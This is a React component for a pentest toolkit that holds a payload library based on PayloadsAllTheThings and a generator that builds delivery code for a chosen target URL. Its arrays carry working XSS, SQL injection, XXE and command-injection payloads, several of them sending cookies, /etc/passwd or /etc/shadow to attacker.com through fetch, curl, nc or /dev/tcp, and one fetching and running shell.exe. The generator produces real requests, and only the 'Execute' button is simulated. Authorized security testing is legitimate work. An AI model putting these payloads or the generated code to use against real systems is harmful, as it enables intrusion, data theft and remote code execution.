import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { useTerminal } from "@/hooks/use-terminal";
import { Copy, FileUp, Search, Database, Play, Download, ExternalLink } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

// Payload categories based on PayloadsAllTheThings repository
const payloadCategories = [
  { id: "xss", name: "XSS Injection", description: "Cross-Site Scripting attacks" },
  { id: "sqli", name: "SQL Injection", description: "SQL database attacks" },
  { id: "xxe", name: "XXE Injection", description: "XML External Entity attacks" },
  { id: "ssrf", name: "SSRF", description: "Server-Side Request Forgery" },
  { id: "command-injection", name: "Command Injection", description: "OS command injection attacks" },
  { id: "csrf", name: "CSRF", description: "Cross-Site Request Forgery" },
  { id: "file-inclusion", name: "File Inclusion", description: "LFI and RFI attacks" },
  { id: "file-upload", name: "File Upload", description: "Malicious file upload attacks" },
  { id: "open-redirect", name: "Open Redirect", description: "URL redirection attacks" },
  { id: "race-condition", name: "Race Condition", description: "Timing-based vulnerabilities" },
  { id: "insecure-deserialization", name: "Insecure Deserialization", description: "Deserialization attacks" },
  { id: "jwt", name: "JWT", description: "JSON Web Token attacks" },
  { id: "nosql", name: "NoSQL Injection", description: "NoSQL database attacks" },
  { id: "oauth", name: "OAuth", description: "OAuth authentication attacks" },
  { id: "windows-api-abuse", name: "Windows API Abuse", description: "Windows API exploitation" },
];

// XSS Payloads
const xssPayloads = [
  {
    name: "Basic XSS",
    examples: [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      '<svg/onload=alert("XSS")>',
    ]
  },
  {
    name: "Bypass Filters",
    examples: [
      '<img src="javascript:alert(\'XSS\')">',
      '<div style="background-image: url(javascript:alert(\'XSS\'))">',
      '<a href="javascript:alert(\'XSS\')">Click me</a>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+"></object>',
    ]
  },
  {
    name: "DOM XSS",
    examples: [
      '<a href="#" onclick="alert(\'XSS\')">Click me</a>',
      '<a href="javascript:eval(\\\'alert(document.domain)\\\')">Click me</a>',
      '<img src="x" onerror="window.location=\'https://attacker.com/log?c=\'+document.cookie">',
      '<script>document.getElementById("demo").innerHTML = location.hash.substring(1);</script>',
      '<script>eval(location.hash.slice(1))</script>',
    ]
  },
  {
    name: "Polyglots",
    examples: [
      'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>',
      '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)',
      '"><script>alert(document.cookie)</script>',
      '\'><script>alert(document.cookie)</script>',
    ]
  },
  {
    name: "Advanced XSS",
    examples: [
      '(function(){var script=document.createElement(\'script\');script.src=\'https://attacker.com/xss.js\';document.body.appendChild(script)})();',
      'var xhr = new XMLHttpRequest();xhr.open(\'GET\', \'https://attacker.com/steal?cookie=\'+document.cookie, true);xhr.send();',
      'navigator.sendBeacon(\'https://attacker.com/log\', JSON.stringify({cookies:document.cookie,url:location.href,html:document.body.innerHTML}))',
      'setTimeout(\'alert(document.domain)\', 1000)',
      'fetch(\'https://attacker.com/log\', {method:\'POST\',body:JSON.stringify({data:document.cookie})})',
    ]
  }
];

// SQL Injection Payloads
const sqliPayloads = [
  {
    name: "Basic SQLi",
    examples: [
      '\'OR 1=1--',
      '\'OR \'1\'=\'1',
      '"OR 1=1--',
      'OR 1=1--',
      '\' OR \'\'=\'',
    ]
  },
  {
    name: "Union Based",
    examples: [
      'UNION SELECT 1,2,3--',
      'UNION SELECT 1,2,3,4--',
      'UNION SELECT username,password FROM users--',
      'UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--',
      'UNION SELECT NULL,concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--',
    ]
  },
  {
    name: "Error Based",
    examples: [
      'AND extractvalue(rand(),concat(0x3a,(SELECT version())))--',
      'AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT database()),0x7e))s), 8446744073709551610, 8446744073709551610)))--',
      'AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))s), 8446744073709551610, 8446744073709551610)))--',
      'AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--',
      'AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))--',
    ]
  },
  {
    name: "Time Based",
    examples: [
      'AND SLEEP(5)--',
      'AND (SELECT * FROM (SELECT(SLEEP(5)))a)--',
      'BENCHMARK(10000000,MD5(\'A\'))--',
      'pg_sleep(5)--',
      'WAITFOR DELAY \'0:0:5\'--',
    ]
  },
  {
    name: "Blind SQLi",
    examples: [
      'AND 1=1--',
      'AND 1=2--',
      'AND SUBSTRING((SELECT password FROM users WHERE username=\'admin\'),1,1)=\'a\'--',
      'AND ASCII(SUBSTRING((SELECT password FROM users WHERE username=\'admin\'),1,1))>90--',
      'AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=\'database\') > 10--',
    ]
  }
];

// XXE Payloads
const xxePayloads = [
  {
    name: "Basic XXE",
    examples: [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>',
    ]
  },
  {
    name: "SSRF via XXE",
    examples: [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/secret">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://localhost:8080/admin">]><data>&file;</data>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "https://api.internal/v1/users">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://internal.service.local/api/admin">]><root>&test;</root>',
    ]
  },
  {
    name: "Parameter Entities",
    examples: [
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?data=%file;\'>">%eval;%exfil;]><data>test</data>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?data=%file;\'>">%eval;%exfil;]><data>test</data>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % payload SYSTEM "http://attacker.com/xxe.dtd">%payload;]><data>test</data>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">%xxe;]><foo>test</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % tmp "<!ENTITY send SYSTEM \'http://attacker.com/?%xxe;\'>">%tmp;]><foo>&send;</foo>',
    ]
  },
  {
    name: "OOB XXE",
    examples: [
      '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>',
      '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
      '<!-- DTD file at http://attacker.com/malicious.dtd --><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % all "<!ENTITY send SYSTEM \'http://attacker.com/?%file;\'>">%all;',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>',
      '<!-- DTD at attacker.com/xxe.dtd --><!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://attacker.com/log?%data;\'>">%param1;',
    ]
  },
  {
    name: "Blind XXE",
    examples: [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>test</foo>',
      '<!-- DTD stored at http://attacker.com/evil.dtd --><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://attacker.com/?file=%file;\'>">%eval;%exfiltrate;',
      '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]><foo>test</foo>',
      '<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]>',
    ]
  }
];

// Command Injection Payloads
const commandInjectionPayloads = [
  {
    name: "Basic Command Injection",
    examples: [
      '; ls -la',
      '| ls -la',
      '`ls -la`',
      '$(ls -la)',
      '&& ls -la',
    ]
  },
  {
    name: "Windows Command Injection",
    examples: [
      '& dir',
      '| dir',
      '`dir`',
      '; dir',
      '&& dir',
    ]
  },
  {
    name: "Blind Command Injection",
    examples: [
      '; ping -c 10 attacker.com',
      '| curl http://attacker.com',
      '`wget http://attacker.com`',
      '$(curl http://attacker.com/?$(whoami))',
      '& ping -n 10 attacker.com',
    ]
  },
  {
    name: "Filter Bypasses",
    examples: [
      '\';\'ls\';\'',
      '";"ls";"',
      'ls${IFS}-la',
      'ls%20-la',
      'cat${IFS}/etc/passwd',
    ]
  },
  {
    name: "Data Exfiltration",
    examples: [
      '; curl -d "$(cat /etc/passwd)" http://attacker.com',
      '| base64 /etc/passwd | curl -d @- http://attacker.com',
      '`cat /etc/passwd > /dev/tcp/attacker.com/8080`',
      '$(cat /etc/passwd | nc attacker.com 80)',
      '& certutil -urlcache -split -f "http://attacker.com/shell.exe" shell.exe & shell.exe',
    ]
  }
];

// Function to get payloads based on category
const getPayloadsByCategory = (category: string) => {
  switch (category) {
    case 'xss': return xssPayloads;
    case 'sqli': return sqliPayloads;
    case 'xxe': return xxePayloads;
    case 'command-injection': return commandInjectionPayloads;
    // Add more cases for other categories
    default: return xssPayloads; // Default to XSS
  }
};

export default function PayloadAllStar() {
  const { toast } = useToast();
  const { addSystemLine, addInfoLine, addErrorLine } = useTerminal();
  
  const [selectedCategory, setSelectedCategory] = useState("xss");
  const [currentPayloads, setCurrentPayloads] = useState(xssPayloads);
  const [searchQuery, setSearchQuery] = useState("");
  const [filteredPayloads, setFilteredPayloads] = useState(xssPayloads);
  const [activeTab, setActiveTab] = useState("browse");
  const [selectedPayload, setSelectedPayload] = useState<string>("");
  const [customPayload, setCustomPayload] = useState("");
  const [target, setTarget] = useState("");
  const [generatedCode, setGeneratedCode] = useState("");
  
  // Update payloads when category changes
  useEffect(() => {
    const payloads = getPayloadsByCategory(selectedCategory);
    setCurrentPayloads(payloads);
    setFilteredPayloads(payloads);
  }, [selectedCategory]);
  
  // Filter payloads based on search query
  useEffect(() => {
    if (!searchQuery.trim()) {
      setFilteredPayloads(currentPayloads);
      return;
    }
    
    const query = searchQuery.toLowerCase();
    const filtered = currentPayloads.flatMap(group => {
      const matchingExamples = group.examples.filter(example => 
        example.toLowerCase().includes(query)
      );
      
      if (matchingExamples.length > 0) {
        return [{
          name: group.name,
          examples: matchingExamples
        }];
      }
      
      return [];
    });
    
    setFilteredPayloads(filtered);
  }, [searchQuery, currentPayloads]);
  
  // Copy payload to clipboard
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied to clipboard",
      description: "Payload copied to clipboard successfully"
    });
    
    // Log to terminal
    addInfoLine(`Copied payload: ${text.substring(0, 50)}${text.length > 50 ? '...' : ''}`);
  };
  
  // Handle category change
  const handleCategoryChange = (category: string) => {
    setSelectedCategory(category);
    setSearchQuery("");
    
    // Log to terminal
    addSystemLine(`Switched to ${payloadCategories.find(c => c.id === category)?.name} payloads`);
  };
  
  // Generate usage code
  const generateCode = () => {
    if (!selectedPayload && !customPayload) {
      toast({
        variant: "destructive",
        title: "No payload selected",
        description: "Please select or enter a payload first"
      });
      return;
    }
    
    const payload = selectedPayload || customPayload;
    
    if (!target) {
      toast({
        variant: "destructive",
        title: "No target specified",
        description: "Please enter a target URL or parameter"
      });
      return;
    }
    
    let code = "";
    
    // Generate different code based on the category
    switch (selectedCategory) {
      case 'xss':
        code = `
// XSS Payload Delivery
// Target: ${target}

// Method 1: URL Parameter Injection
const xssUrl = "${target}?param=${encodeURIComponent(payload)}";
console.log("XSS URL:", xssUrl);

// Method 2: DOM Injection
document.getElementById("vulnerable-element").innerHTML = \`${payload.replace(/`/g, "\\`")}\`;

// Method 3: Form Submission
const xssForm = document.createElement("form");
xssForm.action = "${target}";
xssForm.method = "POST";

const inputField = document.createElement("input");
inputField.type = "hidden";
inputField.name = "user_input";
inputField.value = \`${payload.replace(/`/g, "\\`")}\`;

xssForm.appendChild(inputField);
document.body.appendChild(xssForm);
// xssForm.submit(); // Uncomment to automatically submit
`;
        break;
      
      case 'sqli':
        code = `
// SQL Injection Attack
// Target: ${target}

// Method 1: URL Parameter Injection
const sqliUrl = "${target}?id=${encodeURIComponent(payload)}";
console.log("SQLi URL:", sqliUrl);

// Method 2: Fetch API with POST request
fetch("${target}", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "username=${encodeURIComponent(payload)}&password=test"
})
.then(response => response.text())
.then(data => {
  console.log("Response:", data);
})
.catch(error => {
  console.error("Error:", error);
});

// Method 3: Prepared for Automated Testing
async function testSQLInjection() {
  try {
    const response = await fetch("${target}", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        query: \`${payload.replace(/`/g, "\\`")}\`
      })
    });
    
    const data = await response.text();
    console.log("SQLi Test Result:", data);
    return data;
  } catch (error) {
    console.error("SQLi Test Failed:", error);
    return null;
  }
}
`;
        break;
        
      case 'xxe':
        code = `
// XXE Injection Attack
// Target: ${target}

// Method 1: XML HTTP Request
const xxePayload = \`${payload.replace(/`/g, "\\`")}\`;

const xhr = new XMLHttpRequest();
xhr.open("POST", "${target}", true);
xhr.setRequestHeader("Content-Type", "application/xml");
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    console.log("Response:", xhr.responseText);
  }
};
xhr.send(xxePayload);

// Method 2: Fetch API
fetch("${target}", {
  method: "POST",
  headers: {
    "Content-Type": "application/xml",
  },
  body: xxePayload
})
.then(response => response.text())
.then(data => {
  console.log("XXE Response:", data);
})
.catch(error => {
  console.error("XXE Error:", error);
});

// Method 3: Form Submission with XML Payload
function submitXXEForm() {
  const form = document.createElement("form");
  form.action = "${target}";
  form.method = "POST";
  
  const input = document.createElement("input");
  input.type = "hidden";
  input.name = "xml_data";
  input.value = xxePayload;
  
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}
`;
        break;
        
      case 'command-injection':
        code = `
// Command Injection Attack
// Target: ${target}

// Method 1: URL Parameter Injection
const cmdUrl = "${target}?cmd=${encodeURIComponent(payload)}";
console.log("Command Injection URL:", cmdUrl);

// Method 2: Fetch API with POST request
fetch("${target}", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "command=${encodeURIComponent(payload)}"
})
.then(response => response.text())
.then(data => {
  console.log("Command Injection Response:", data);
})
.catch(error => {
  console.error("Command Injection Error:", error);
});

// Method 3: Automated Testing Function
async function testCommandInjection(commands) {
  const results = [];
  
  for (const cmd of commands) {
    try {
      const response = await fetch("${target}", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ input: cmd })
      });
      
      const data = await response.text();
      results.push({ command: cmd, result: data });
    } catch (error) {
      results.push({ command: cmd, error: error.message });
    }
  }
  
  return results;
}

// Example usage
// testCommandInjection([
//   "${payload.replace(/"/g, "\\\"")}",
//   "echo vulnerable",
//   "whoami"
// ]).then(console.table);
`;
        break;
        
      default:
        code = `
// Generic Payload Delivery
// Target: ${target}
// Payload: ${payload}

// Method 1: URL Parameter Injection
const payloadUrl = "${target}?input=${encodeURIComponent(payload)}";
console.log("Payload URL:", payloadUrl);

// Method 2: Fetch API with payload
fetch("${target}", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    data: \`${payload.replace(/`/g, "\\`")}\`
  })
})
.then(response => response.text())
.then(data => {
  console.log("Response:", data);
})
.catch(error => {
  console.error("Error:", error);
});
`;
    }
    
    setGeneratedCode(code);
    addSystemLine("Generated exploitation code");
    addInfoLine(`Target: ${target}`);
    addInfoLine(`Payload category: ${selectedCategory}`);
  };
  
  // Execute the attack (simulated)
  const executeAttack = () => {
    if (!selectedPayload && !customPayload) {
      toast({
        variant: "destructive",
        title: "No payload selected",
        description: "Please select or enter a payload first"
      });
      return;
    }
    
    if (!target) {
      toast({
        variant: "destructive",
        title: "No target specified",
        description: "Please enter a target URL or parameter"
      });
      return;
    }
    
    // This is a simulation - no actual attack is performed
    addSystemLine("Starting payload execution (simulation)");
    addInfoLine(`Target: ${target}`);
    addInfoLine(`Payload: ${selectedPayload || customPayload}`);
    
    // Simulate progress
    let progress = 0;
    const interval = setInterval(() => {
      progress += 10;
      addInfoLine(`Execution progress: ${progress}%`);
      
      if (progress >= 100) {
        clearInterval(interval);
        
        // Simulate a random result
        const success = Math.random() > 0.3;
        
        if (success) {
          addSystemLine("Payload execution completed successfully");
          addInfoLine("Target appears to be vulnerable");
          
          toast({
            title: "Execution Complete",
            description: "The payload was successfully executed (simulated)"
          });
        } else {
          addErrorLine("Payload execution failed");
          addInfoLine("Target may have protections in place");
          
          toast({
            variant: "destructive",
            title: "Execution Failed",
            description: "The payload execution was unsuccessful (simulated)"
          });
        }
      }
    }, 500);
  };
  
  return (
    <div className="space-y-6">
      <Card className="p-4 border-primary/30 bg-card">
        <h2 className="text-xl font-tech text-primary mb-4">Payload All Star</h2>
        <p className="text-sm text-muted-foreground mb-4">
          A comprehensive collection of payloads for various web exploitation techniques.
          Based on PayloadsAllTheThings repository.
        </p>
        
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid grid-cols-2 mb-4">
            <TabsTrigger value="browse" className="font-tech">Browse Payloads</TabsTrigger>
            <TabsTrigger value="execute" className="font-tech">Execute Payloads</TabsTrigger>
          </TabsList>
          
          <TabsContent value="browse" className="space-y-4">
            <div className="flex flex-col space-y-4 sm:flex-row sm:space-y-0 sm:space-x-4">
              <div className="w-full sm:w-1/3">
                <Label htmlFor="category-select" className="text-sm font-tech">Payload Category</Label>
                <Select 
                  value={selectedCategory} 
                  onValueChange={handleCategoryChange}
                >
                  <SelectTrigger className="w-full mt-1">
                    <SelectValue placeholder="Select category" />
                  </SelectTrigger>
                  <SelectContent>
                    {payloadCategories.map((category) => (
                      <SelectItem key={category.id} value={category.id}>
                        {category.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div className="w-full sm:w-2/3">
                <Label htmlFor="search-payloads" className="text-sm font-tech">Search Payloads</Label>
                <div className="relative mt-1">
                  <Search className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                  <Input
                    id="search-payloads"
                    placeholder="Search for payloads..."
                    className="pl-10"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                  />
                </div>
              </div>
            </div>
            
            <div className="flex mt-2 text-sm text-muted-foreground">
              <Database className="h-4 w-4 mr-2" />
              <span>
                Showing {filteredPayloads.reduce((count, group) => count + group.examples.length, 0)} payloads 
                in {filteredPayloads.length} categories
              </span>
            </div>
            
            <Separator className="my-4" />
            
            <div className="space-y-4">
              {filteredPayloads.length > 0 ? (
                <Accordion type="multiple" className="w-full">
                  {filteredPayloads.map((group, groupIndex) => (
                    <AccordionItem key={groupIndex} value={`item-${groupIndex}`}>
                      <AccordionTrigger className="text-primary font-tech">
                        {group.name} ({group.examples.length})
                      </AccordionTrigger>
                      <AccordionContent>
                        {group.examples.map((payload, payloadIndex) => (
                          <div 
                            key={payloadIndex} 
                            className="font-mono text-sm bg-secondary/10 p-3 rounded mb-2 relative group"
                          >
                            <pre className="whitespace-pre-wrap break-all">{payload}</pre>
                            <div className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity">
                              <Button 
                                variant="ghost" 
                                size="sm" 
                                className="h-8 w-8 p-0" 
                                onClick={() => copyToClipboard(payload)}
                              >
                                <Copy className="h-4 w-4" />
                              </Button>
                            </div>
                          </div>
                        ))}
                      </AccordionContent>
                    </AccordionItem>
                  ))}
                </Accordion>
              ) : (
                <div className="text-center py-8 text-muted-foreground">
                  No payloads found matching your search criteria
                </div>
              )}
            </div>
            
            <div className="flex justify-between items-center">
              <a 
                href="https://github.com/swisskyrepo/PayloadsAllTheThings" 
                target="_blank" 
                rel="noreferrer"
                className="text-sm text-primary flex items-center hover:underline"
              >
                <ExternalLink className="h-4 w-4 mr-1" />
                View full repository
              </a>
              
              <Button variant="outline" onClick={() => setActiveTab("execute")}>
                Use Selected Payload
              </Button>
            </div>
          </TabsContent>
          
          <TabsContent value="execute" className="space-y-4">
            <div className="space-y-4">
              <div>
                <Label htmlFor="target-input" className="text-sm font-tech">Target URL or Parameter</Label>
                <Input
                  id="target-input"
                  placeholder="https://example.com/vulnerable.php"
                  value={target}
                  onChange={(e) => setTarget(e.target.value)}
                  className="mt-1"
                />
              </div>
              
              <div>
                <Label htmlFor="payload-input" className="text-sm font-tech">Payload</Label>
                <Textarea
                  id="payload-input"
                  placeholder="Enter or paste a payload..."
                  value={customPayload}
                  onChange={(e) => {
                    setCustomPayload(e.target.value);
                    setSelectedPayload(""); // Clear selected payload when custom is entered
                  }}
                  className="font-mono mt-1 min-h-20"
                />
              </div>
              
              <div>
                <Label className="text-sm font-tech">Select from Library</Label>
                <Select 
                  value={selectedPayload} 
                  onValueChange={(value) => {
                    setSelectedPayload(value);
                    setCustomPayload(""); // Clear custom payload when selecting from library
                  }}
                >
                  <SelectTrigger className="w-full mt-1">
                    <SelectValue placeholder="Select a payload" />
                  </SelectTrigger>
                  <SelectContent>
                    {currentPayloads.map((group, groupIndex) => (
                      <div key={groupIndex}>
                        <div className="px-2 py-1.5 text-sm font-semibold">{group.name}</div>
                        {group.examples.map((example, exampleIndex) => (
                          <SelectItem 
                            key={`${groupIndex}-${exampleIndex}`} 
                            value={example}
                            className="font-mono text-xs"
                          >
                            {example.length > 30 ? `${example.substring(0, 30)}...` : example}
                          </SelectItem>
                        ))}
                      </div>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div className="flex justify-between space-x-4">
                <Button
                  variant="outline"
                  className="w-1/2"
                  onClick={generateCode}
                >
                  <Play className="mr-2 h-4 w-4" />
                  Generate Code
                </Button>
                
                <Button
                  className="w-1/2"
                  onClick={executeAttack}
                >
                  <Play className="mr-2 h-4 w-4" />
                  Execute (Simulation)
                </Button>
              </div>
            </div>
            
            {generatedCode && (
              <div className="space-y-2 mt-4">
                <div className="flex justify-between items-center">
                  <Label htmlFor="code-output" className="text-sm font-tech">Generated Code</Label>
                  <Button 
                    variant="ghost" 
                    size="sm" 
                    className="h-8" 
                    onClick={() => copyToClipboard(generatedCode)}
                  >
                    <Copy className="h-3 w-3 mr-1" />
                    Copy Code
                  </Button>
                </div>
                <div className="relative">
                  <pre className="font-mono text-xs bg-secondary/10 p-4 rounded overflow-x-auto">
                    {generatedCode}
                  </pre>
                </div>
              </div>
            )}
          </TabsContent>
        </Tabs>
      </Card>
      
      <Card className="p-4 border-destructive/30 bg-card/80">
        <h3 className="text-lg font-tech text-destructive mb-2">Security Warning</h3>
        <div className="space-y-3 text-sm">
          <p>
            This tool is provided for educational and authorized security testing purposes only. 
            Unauthorized use of these payloads against systems you do not own or have explicit 
            permission to test is illegal and unethical.
          </p>
          <p>
            <span className="font-semibold">Key points to remember:</span>
          </p>
          <ul className="list-disc list-inside space-y-1 ml-2">
            <li>Always obtain proper authorization before testing</li>
            <li>Document all testing activities</li>
            <li>Use in controlled environments when possible</li>
            <li>Report vulnerabilities responsibly</li>
            <li>Be aware of legal regulations in your jurisdiction</li>
          </ul>
        </div>
      </Card>
    </div>
  );
}